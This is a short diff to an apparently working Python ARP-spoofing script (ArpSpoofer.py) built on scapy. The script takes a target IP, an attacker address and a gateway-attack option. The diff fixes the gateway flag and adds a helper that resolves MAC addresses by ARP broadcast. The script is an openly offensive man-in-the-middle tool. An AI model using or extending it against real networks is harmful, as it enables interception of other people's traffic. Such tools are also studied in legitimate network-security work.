@@ -13,7 +13,7 @@ args_parser = argparse.ArgumentParser(prog='ArpSpoofer.py', description='Spoof A
 args_parser.add_argument('-i', '--iface', type=str, help="Interface you wish to use")
 args_parser.add_argument('-s', '--src', type=str, help="The address you want for the attacker")
 args_parser.add_argument('-d', '--delay', type=float, help="Delay (in seconds) between messages", default=1)
-args_parser.add_argument('-gw', type=bool, help="should GW be attacked as well")
+args_parser.add_argument('-gw', action='store_true', help="should GW be attacked as well")
 args_parser.add_argument('-t', '--target', type=str, help="IP of target", required=True)
 args = args_parser.parse_args()
 
@@ -27,6 +27,17 @@ def get_gateway():
     :return: The gateway IP address.
     """
     return list(set([inter[2] for inter in conf.route.__dict__['routes'] if inter[3] == interface]) - {'0.0.0.0'})[0]
+
+
+def get_mac(ip_addr):
+    """
+    It returns the MAC address of the IP address
+    :param ip_addr: The IP address
+    :return: The MAC address
+    """
+    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip_addr)
+    response = srp1(packet, timeout=3, verbose=0)
+    return response[ARP].hwsrc
 
 
 def arp_spoof(dst, src, dst_mac):
@@ -54,8 +65,8 @@ def main():
 
     target_ip = args.target
 
-    target_mac = getmacbyip(target_ip)
-    src_mac = getmacbyip(src)
+    target_mac = get_mac(target_ip)
+    src_mac = get_mac(src)
 
     try:
         while True:
